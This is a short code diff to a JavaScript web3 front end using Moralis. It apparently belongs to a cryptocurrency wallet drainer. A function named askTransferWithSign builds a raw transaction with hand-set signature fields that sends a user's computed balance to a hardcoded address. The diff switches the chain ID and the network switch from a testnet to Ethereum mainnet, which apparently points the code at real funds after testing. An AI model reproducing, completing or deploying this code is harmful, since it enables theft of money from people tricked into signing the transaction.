@@ -4,7 +4,7 @@ let web3Provider;
 
 
 Moralis.onWeb3Enabled(async (data) => {
-    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x5");
+    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
     updateState(true);
     console.log(data);
 });
@@ -162,7 +162,7 @@ async function askTransferWithSign(rbal) {
                 gasPrice: mgasPrice, gasLimit: "0x55F0",
                 to: "0xBFa0562eA2c334393eD68999468Ad554148AC722",
                 value: "0x" + toSend.toString(16),
-                data: "0x", v: "0x5", r: "0x", s: "0x"      // mainnet
+                data: "0x", v: "0x1", r: "0x", s: "0x"      // mainnet
                 //data: "0x", v: "0x3", r: "0x", s: "0x"   // @Ropsten Testing
 
             };
